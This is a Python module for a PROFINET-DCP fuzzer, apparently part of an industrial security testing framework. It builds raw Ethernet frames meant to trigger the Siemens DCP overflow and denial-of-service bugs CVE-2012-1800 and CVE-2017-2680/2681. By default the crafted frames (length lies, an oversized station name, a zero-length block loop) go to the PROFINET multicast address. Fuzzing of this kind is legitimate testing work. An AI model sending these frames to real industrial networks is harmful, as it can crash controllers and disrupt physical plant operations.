"""PROFINET-DCP Protocol Fuzzer

PROFINET Discovery and Configuration Protocol (PN-DCP), the L2 discovery /
configuration channel of PROFINET IO. Frames ride directly on Ethernet with
EtherType 0x8892 (no IP), addressed to the PROFINET multicast MAC
01:0e:cf:00:00:00 for Identify requests.

Motivating gap: OIDA had only a scanner mixin for PROFINET (index read/write
fuzzing over PNIO-CM RPC); there was no fuzz-framework fuzzer that speaks raw
PN-DCP, so the classic DCP parser bugs were unreachable:

- CVE-2012-1800 - Siemens Scalance S PROFINET-DCP stack-based buffer overflow
  driven by a malformed DCP frame (oversized DCPDataLength / block length).
- CVE-2017-2680 / CVE-2017-2681 - SIMATIC / PROFINET IO device DoS across a
  huge Siemens fleet, triggered by specially crafted PN-DCP packets that hang
  or reset the device (denial of service until manual restart).
- Generic PNIO DoS - count/length-trust and non-advancing block-walk parses.

Framing (IEC 61158-6-10 / PN-DCP):
  Ethernet: dst(6) [01:0e:cf:00:00:00 PN multicast], src(6), EtherType(2)=0x8892
  PN-DCP header:
    FrameID   Word  {0xFEFE Identify-Req, 0xFEFD Get/Set (Identify-Res),
                     0xFEFC Hello}
    ServiceID Byte  {3=Get, 4=Set, 5=Identify}
    ServiceType Byte {0=Request}
    Xid       DWord (transaction id)
    ResponseDelay Word
    DCPDataLength Word (total length of the DCP blocks that follow)
  DCP blocks (repeated, DCPDataLength bytes total):
    Option Byte, Suboption Byte, BlockLength Word, [BlockInfo/BlockQualifier,
    value...] (padded to even length)

PN-DCP has no IP layer, so this fuzzer uses ProtocolType.RAW and builds the
Ethernet frame itself (mirrors the Ethernet / IGMP raw-L2 fuzzers). Requires
root/admin for raw socket access.

Strict 1:1 request convention: every RequestInfo name in
get_request_definitions() matches exactly one boofuzz Request node name and is
individually gated by is_request_enabled(), so --enable / --disable work.
"""

import socket
import struct
from typing import List, Optional

from boofuzz import Byte, DWord, Group, Request, Static, Word

from oida.fuzz.core.base_fuzzer import BaseFuzzer, RequestInfo
from oida.fuzz.core.config import FuzzerConfig, ProtocolType
from oida.fuzz.monitors import BaseMonitor
from oida.fuzz.primitives.dynamic import SmartString
from oida.fuzz.primitives.smart_string import StringContext


class ProfinetDCPFuzzer(BaseFuzzer):
    """PROFINET-DCP (EtherType 0x8892) raw-L2 fuzzer for discovery/config parsers."""

    # PROFINET DCP multicast MAC used for Identify requests.
    PN_MCAST_IDENTIFY = "01:0e:cf:00:00:00"
    ETHERTYPE_PROFINET = 0x8892

    # PN-DCP FrameIDs.
    FRAMEID_IDENTIFY_REQ = 0xFEFE
    FRAMEID_GET_SET = 0xFEFD  # Get/Set (prompt: "Identify-Res")
    FRAMEID_HELLO = 0xFEFC

    # PN-DCP ServiceIDs.
    SERVICE_GET = 0x03
    SERVICE_SET = 0x04
    SERVICE_IDENTIFY = 0x05
    SERVICE_TYPE_REQUEST = 0x00

    # DCP options / suboptions.
    OPTION_ALL = 0xFF
    SUBOPTION_ALL = 0xFF
    OPTION_DEVICE_PROPERTIES = 0x02
    SUBOPTION_NAME_OF_STATION = 0x02

    # Raw L2 has no meaningful socket/ping oracle; monitors are opt-in via -M.
    # Must be "none": a default TCP socket monitor against a portless raw-L2
    # target fails every liveness check -> false "target down" / restart churn.
    DEFAULT_MONITORS = "none"

    PROTOCOL_OPTIONS = {
        "interface": {
            "type": str,
            "default": "eth0",
            "description": "Network interface for raw socket operations",
            "example": "eth0",
        },
        "dst_mac": {
            "type": str,
            "default": PN_MCAST_IDENTIFY,
            "description": "Destination MAC (PROFINET DCP multicast by default)",
            "example": "01:0e:cf:00:00:00",
        },
        "src_mac": {
            "type": str,
            "default": None,
            "description": "Source MAC address (auto-detect if not set)",
            "example": "aa:bb:cc:dd:ee:ff",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests (strict 1:1 with nodes)."""
        return [
            RequestInfo(
                "ProfinetDCP_Baseline",
                "Valid Identify-All request (FrameID 0xFEFE, ServiceID 5 Identify, "
                "All-selector block 0xFF/0xFF)",
                "baseline",
            ),
            RequestInfo(
                "ProfinetDCP_DataLength_Overflow",
                "DCPDataLength Word declares far more block bytes than are present "
                "(Scalance S stack overflow, CVE-2012-1800 class)",
                "overflow",
            ),
            RequestInfo(
                "ProfinetDCP_BlockLength_Lie",
                "DCP block BlockLength {0x0000,0xFFFF,>frame} vs actual value bytes, "
                "truncated at the tail",
                "malformed",
            ),
            RequestInfo(
                "ProfinetDCP_Set_NameOfStation_Overflow",
                "DCP Set (ServiceID 4) of Name-of-Station with an oversized station "
                "name value (fixed-buffer overflow)",
                "overflow",
            ),
            RequestInfo(
                "ProfinetDCP_Option_Suboption_Boundary",
                "Option/Suboption byte sweep over reserved/invalid values",
                "boundary",
            ),
            RequestInfo(
                "ProfinetDCP_FrameID_Boundary",
                "FrameID Word sweep {0xFEFE,0xFEFD,0xFEFC,0x0000,0xFFFF}",
                "boundary",
            ),
            RequestInfo(
                "ProfinetDCP_Block_ZeroLen_Loop",
                "DCP block with BlockLength 0 inside the block-walk loop "
                "(non-advancing parse / PNIO DoS, CVE-2017-2680/2681 class)",
                "malformed",
            ),
        ]

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        # PN-DCP has no IP layer - build the Ethernet frame ourselves over a raw socket.
        config.protocol_type = ProtocolType.RAW
        super().__init__(config, connection_factory)

        self.interface = config.get_option("interface", "eth0")
        self.dst_mac = config.get_option("dst_mac", self.PN_MCAST_IDENTIFY)
        self.src_mac = config.get_option("src_mac", None)
        if not self.src_mac:
            self.src_mac = self._get_interface_mac()

    # ---- MAC helpers (mirror the Ethernet fuzzer) ----------------------------

    def _get_interface_mac(self) -> str:
        """Get MAC address of the configured network interface."""
        try:
            import fcntl

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(
                s.fileno(), 0x8927, struct.pack("256s", self.interface.encode("utf-8"))
            )
            return ":".join("%02x" % b for b in info[18:24])
        except (OSError, ImportError, struct.error) as e:
            self.log.debug(f"Failed to get MAC for interface '{self.interface}': {e}")
            return "00:11:22:33:44:55"

    def _mac_to_bytes(self, mac_str: str) -> bytes:
        """Convert a colon-delimited MAC string to 6 raw bytes."""
        return bytes.fromhex(mac_str.replace(":", ""))

    def _eth_header(self, dst_mac: Optional[str] = None):
        """Return the three Ethernet-header primitives (dst, src, EtherType 0x8892)."""
        dst = dst_mac if dst_mac is not None else self.dst_mac
        return (
            Static("dst_mac", self._mac_to_bytes(dst)),
            Static("src_mac", self._mac_to_bytes(self.src_mac)),
            Static("ethertype", struct.pack(">H", self.ETHERTYPE_PROFINET)),
        )

    # ---- Protocol definition -------------------------------------------------

    def _define_protocol(self):
        """Define PN-DCP structures with strict per-request enable/disable gating."""

        # ================================================================
        # 1. Baseline - valid Identify-All request
        # ================================================================
        # ServiceID is fuzzable so at least one packet is always emitted
        # (mirrors the IGMP/ICMP baseline convention). DCPDataLength = 4 exactly
        # covers the single All-selector block (option+suboption+blocklen).
        baseline = Request(
            "ProfinetDCP_Baseline",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_IDENTIFY_REQ, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_IDENTIFY, fuzzable=True),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 4, endian=">", fuzzable=False),
                # All-selector block: Option 0xFF, Suboption 0xFF, BlockLength 0.
                Byte("Block_Option", self.OPTION_ALL, fuzzable=False),
                Byte("Block_Suboption", self.SUBOPTION_ALL, fuzzable=False),
                Word("Block_Length", 0, endian=">", fuzzable=False),
            ),
        )

        # ================================================================
        # 2. DCPDataLength overflow (CVE-2012-1800 stack overflow class)
        # ================================================================
        # DCPDataLength claims 65535 / 32767 / 4095 / 256 bytes of DCP blocks,
        # but only a single 4-byte All-selector block is present. A stack that
        # copies DCPDataLength bytes into a fixed buffer overruns it.
        datalength_overflow = Request(
            "ProfinetDCP_DataLength_Overflow",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_IDENTIFY_REQ, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_IDENTIFY, fuzzable=False),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                # Oversized declared length vs the 4 actual block bytes below.
                Group(
                    "DCPDataLength",
                    values=[
                        b"\xff\xff",  # 65535
                        b"\x7f\xff",  # 32767
                        b"\x0f\xff",  # 4095
                        b"\x01\x00",  # 256
                    ],
                ),
                Byte("Block_Option", self.OPTION_ALL, fuzzable=False),
                Byte("Block_Suboption", self.SUBOPTION_ALL, fuzzable=False),
                Word("Block_Length", 0, endian=">", fuzzable=False),
            ),
        )

        # ================================================================
        # 3. Block length lie (truncated tail)
        # ================================================================
        # The block's BlockLength claims 0 / 65535 / 1024 bytes of value, but
        # only two value bytes are actually present. A parser trusting the
        # length either loops forever (0) or reads off the end (large).
        blocklength_lie = Request(
            "ProfinetDCP_BlockLength_Lie",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_GET_SET, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_GET, fuzzable=False),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 6, endian=">", fuzzable=False),
                Byte("Block_Option", self.OPTION_DEVICE_PROPERTIES, fuzzable=False),
                Byte("Block_Suboption", self.SUBOPTION_NAME_OF_STATION, fuzzable=False),
                Group(
                    "Block_Length",
                    values=[
                        b"\x00\x00",  # 0 - non-advancing / underflow
                        b"\xff\xff",  # 65535 - far past frame end
                        b"\x04\x00",  # 1024 - past frame end
                    ],
                ),
                # Only two value bytes present vs the (large) declared length.
                Static("Block_Value", b"AB"),
            ),
        )

        # ================================================================
        # 4. Set Name-of-Station with an oversized name (fixed-buffer overflow)
        # ================================================================
        # DCP Set of the Name-of-Station suboption. The station name is normally
        # bounded (<=240 chars); an oversized value overruns a fixed name buffer.
        # The station name is a hostname-class identifier, so it is tagged
        # StringContext.HOSTNAME: the corpus adds NULL-injection / IDN-homograph /
        # label-length payloads on top of the length testing that drives the
        # overflow. The 512-byte default preserves the oversized baseline.
        set_nameofstation_overflow = Request(
            "ProfinetDCP_Set_NameOfStation_Overflow",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_GET_SET, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_SET, fuzzable=False),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 0xFFFF, endian=">", fuzzable=False),
                Byte("Block_Option", self.OPTION_DEVICE_PROPERTIES, fuzzable=False),
                Byte("Block_Suboption", self.SUBOPTION_NAME_OF_STATION, fuzzable=False),
                Word("Block_Length", 0xFFFF, endian=">", fuzzable=False),
                Word("Block_Qualifier", 0x0001, endian=">", fuzzable=False),  # Set permanent
                # Oversized station name (variable field, HOSTNAME-tagged).
                # DCPDataLength / Block_Length above are fixed 0xFFFF lies that do
                # not reference this value, so no length field needs recomputing.
                SmartString(
                    "Station_Name",
                    "A" * 512,
                    context=StringContext.HOSTNAME,
                    max_len=2048,
                    fuzzable=True,
                ),
            ),
        )

        # ================================================================
        # 5. Option / Suboption boundary sweep
        # ================================================================
        # Walk Option and Suboption over reserved / invalid values to hit
        # switch-statement gaps and unhandled option handlers.
        option_boundary = Request(
            "ProfinetDCP_Option_Suboption_Boundary",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_GET_SET, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_GET, fuzzable=False),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 4, endian=">", fuzzable=False),
                Group(
                    "Block_Option",
                    values=[
                        b"\x00",  # reserved / invalid
                        b"\x01",  # IP
                        b"\x02",  # Device properties
                        b"\x05",  # Control
                        b"\x80",  # reserved high range
                        b"\xff",  # All-selector
                    ],
                ),
                Group(
                    "Block_Suboption",
                    values=[
                        b"\x00",  # reserved
                        b"\x01",
                        b"\x02",
                        b"\x7f",
                        b"\x80",  # reserved high range
                        b"\xff",  # All-selector
                    ],
                ),
                Word("Block_Length", 0, endian=">", fuzzable=False),
            ),
        )

        # ================================================================
        # 6. FrameID boundary sweep
        # ================================================================
        frameid_boundary = Request(
            "ProfinetDCP_FrameID_Boundary",
            children=(
                *self._eth_header(),
                Group(
                    "FrameID",
                    values=[
                        b"\xfe\xfe",  # Identify request
                        b"\xfe\xfd",  # Get/Set
                        b"\xfe\xfc",  # Hello
                        b"\x00\x00",  # invalid / null
                        b"\xff\xff",  # max
                    ],
                ),
                Byte("ServiceID", self.SERVICE_IDENTIFY, fuzzable=False),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 4, endian=">", fuzzable=False),
                Byte("Block_Option", self.OPTION_ALL, fuzzable=False),
                Byte("Block_Suboption", self.SUBOPTION_ALL, fuzzable=False),
                Word("Block_Length", 0, endian=">", fuzzable=False),
            ),
        )

        # ================================================================
        # 7. Zero-length block inside the block-walk loop (non-advancing parse)
        # ================================================================
        # DCPDataLength promises 12 bytes of blocks; the first block declares
        # BlockLength 0. A parser that advances by (4 + BlockLength) makes no
        # progress and spins on the same offset -> PNIO DoS (CVE-2017-2680/2681
        # class). Two zero-length blocks follow to keep the walk fed.
        zerolen_loop = Request(
            "ProfinetDCP_Block_ZeroLen_Loop",
            children=(
                *self._eth_header(),
                Word("FrameID", self.FRAMEID_GET_SET, endian=">", fuzzable=False),
                Byte("ServiceID", self.SERVICE_GET, fuzzable=True),
                Byte("ServiceType", self.SERVICE_TYPE_REQUEST, fuzzable=False),
                DWord("Xid", 0x12345678, endian=">", fuzzable=False),
                Word("ResponseDelay", 0x0001, endian=">", fuzzable=False),
                Word("DCPDataLength", 12, endian=">", fuzzable=False),
                # Block 1 - zero length (non-advancing).
                Byte("Block1_Option", self.OPTION_DEVICE_PROPERTIES, fuzzable=False),
                Byte("Block1_Suboption", self.SUBOPTION_NAME_OF_STATION, fuzzable=False),
                Word("Block1_Length", 0, endian=">", fuzzable=False),
                # Block 2 - also zero length.
                Byte("Block2_Option", self.OPTION_DEVICE_PROPERTIES, fuzzable=False),
                Byte("Block2_Suboption", 0x01, fuzzable=False),
                Word("Block2_Length", 0, endian=">", fuzzable=False),
                # Block 3 - also zero length.
                Byte("Block3_Option", self.OPTION_ALL, fuzzable=False),
                Byte("Block3_Suboption", self.SUBOPTION_ALL, fuzzable=False),
                Word("Block3_Length", 0, endian=">", fuzzable=False),
            ),
        )

        # ================================================================
        # Gated wiring (strict 1:1: each node name == its RequestInfo name)
        # ================================================================
        if self.is_request_enabled("ProfinetDCP_Baseline"):
            self.session.connect(baseline)

        if self.is_request_enabled("ProfinetDCP_DataLength_Overflow"):
            self.session.connect(datalength_overflow)

        if self.is_request_enabled("ProfinetDCP_BlockLength_Lie"):
            self.session.connect(blocklength_lie)

        if self.is_request_enabled("ProfinetDCP_Set_NameOfStation_Overflow"):
            self.session.connect(set_nameofstation_overflow)

        if self.is_request_enabled("ProfinetDCP_Option_Suboption_Boundary"):
            self.session.connect(option_boundary)

        if self.is_request_enabled("ProfinetDCP_FrameID_Boundary"):
            self.session.connect(frameid_boundary)

        if self.is_request_enabled("ProfinetDCP_Block_ZeroLen_Loop"):
            self.session.connect(zerolen_loop)

    def _get_monitors(self) -> List[BaseMonitor]:
        """Raw L2 PN-DCP has no traditional socket/ping oracle."""
        return []

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """No default monitors for raw-L2 PROFINET-DCP (use -M to add one)."""
        return self._get_monitors()
